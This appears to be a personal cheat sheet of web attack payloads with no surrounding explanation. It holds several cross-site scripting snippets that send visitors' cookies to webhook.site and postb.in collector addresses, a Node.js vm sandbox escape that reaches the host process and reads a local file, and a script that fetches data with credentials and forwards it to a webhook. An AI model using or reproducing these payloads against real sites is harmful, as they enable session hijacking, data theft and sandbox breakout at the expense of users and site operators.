TODO
```
<script>var req = new XmlHttpRequest(); req.open("GET", "https://webhook.site/704078be-7bd6-4184-8eec-8446785482fc", true); req.withCredentials = true; req.send(null);</script>


<script>var i=new Image(); i.src="https://webhook.site/704078be-7bd6-4184-8eec-8446785482fc/?cookie="+btoa(document.cookie);</script>

<script>window.location.replace("https://webhook.site/704078be-7bd6-4184-8eec-8446785482fc");</script>

<img src=x onerror="javascript:document.location='https://postb.in/1679131873897-8807206857018?cookie='+document.cookie;">


<script>var i=new Image;i.src="https://webhook.site/704078be-7bd6-4184-8eec-8446785482fc/?"+document.cookie;</script>

<img src=x onerror="this.src='https://webhook.site/704078be-7bd6-4184-8eec-8446785482fc/?'+document.cookie; this.removeAttribute('onerror');">
```

### vm

```javascript
const vm = require('vm');
const result = vm.runInNewContext(`
  (function() {
    var c = 'constructor';
    var require = require=this[c][c]('return process')().mainModule.require;
    var fs = require('fs');
    return String(fs.readFileSync('/home/joshbreckman/Documents/vm.js'));
  })()
`);

console.log(result);
```

### hook

```javascript
<script>
fetch("https://<remote-address>")
  .then((response) => response.json())
  .then((data) => fetch("https://<webhook-address>/?/=".concat(JSON.stringify(data)), { credentials: 'include' }));
</script>
```
